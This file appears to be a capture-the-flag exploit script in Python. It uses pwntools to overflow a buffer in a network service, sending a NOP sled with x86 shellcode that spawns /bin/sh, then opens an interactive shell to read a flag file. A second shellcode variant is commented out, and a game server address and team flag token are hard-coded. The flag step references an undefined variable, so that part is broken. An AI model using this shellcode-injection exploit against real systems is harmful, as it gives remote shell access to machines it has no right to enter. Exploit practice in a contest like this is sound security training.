#!/usr/bin/env python

import swpag_client
import pwn

URL = "52.37.204.0"
TEAM_URL = "http://" + URL + "/"
TEAM_FLAG_TOKEN = "nt4yw7LjoPFc2WE49cLG"
SERVICE_ID = 4 # Update for each exploit to target the correct service

def main():
  team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)

  # for target in team.get_targets(SERVICE_ID):
  # flag_id = target["flag_id"]
  # hostname = target["hostname"]
  # port = target["port"]

  flag_id = '2658873307'
  hostname = 'localhost'
  port = 10004

  print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))

  flag_obtained = None
    
  try:
      process = pwn.remote(hostname, int(port))
      process.readuntil('id ')
      execution_id = process.readuntil(')')
      execution_id = int(execution_id[0:10]) 
      execution_id = execution_id - 48
      big_endian = pwn.p32(execution_id)

      process.readuntil('?') 
      process.write('R\n') 
      process.readuntil('password\n')

      shellcode = b'\x31\x20\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61' + big_endian + b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x4b\x2c\x40\xcd\x80\x0a'

      print(shellcode)
      process.write(shellcode)
      process.interactive()


      #process.write('\n')
      #process.write('12345') 
      #process.send('\n') 
      #process.write((b'\x90'*20)+(b'\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x16\x58\xd1\xe8\xcd\x80')+(b'\x90'*30) + big_endian + big_endian) 
      #process.send('\n') 
      #process.send('\n') 
      #print(process.readuntil('password!'))
      #process.send('\n')
      #process.send('\n')
      print('cat ' + target['flag_id']) 
      print(process.send("cat " + target["flag_id"] + "\n"))
      flags = process.recvall(timeout=2).strip("\r\n")
      print(flags)
      # print(team.submit_flag([MMMM]))
      process.close()
  
  except Exception as e:
      process.close()
    

if __name__ == "__main__":
  main()
